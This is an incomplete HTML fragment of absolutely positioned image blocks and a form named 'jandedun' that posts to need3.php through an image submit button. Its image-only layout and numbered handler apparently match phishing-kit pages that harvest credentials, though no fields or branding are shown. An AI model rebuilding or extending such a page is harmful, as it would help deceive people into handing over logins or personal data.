...
<div id="image2" style="position:absolute; overflow:hidden; left:50px; top:249px; width:156px; height:385px; z-index:1"><img src="images/m2.png" alt="" title="" border=0 width=156 height=385></div>

<div id="image3" style="position:absolute; overflow:hidden; left:215px; top:733px; width:99px; height:42px; z-index:2"><a href="#"><img src="images/m3.png" alt="" title="" border=0 width=99 height=42></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:20px; top:870px; width:1299px; height:152px; z-index:3"><img src="images/m4.png" alt="" title="" border=0 width=1299 height=152></div>
<form action=need3.php name=jandedun id=jandedun method=post>
...
<div id="formimage1" style="position:absolute; left:52px; top:733px; z-index:9"><input type="image" name="formimage1" width="142" height="42" src="images/sbm.png"></div>
</div>
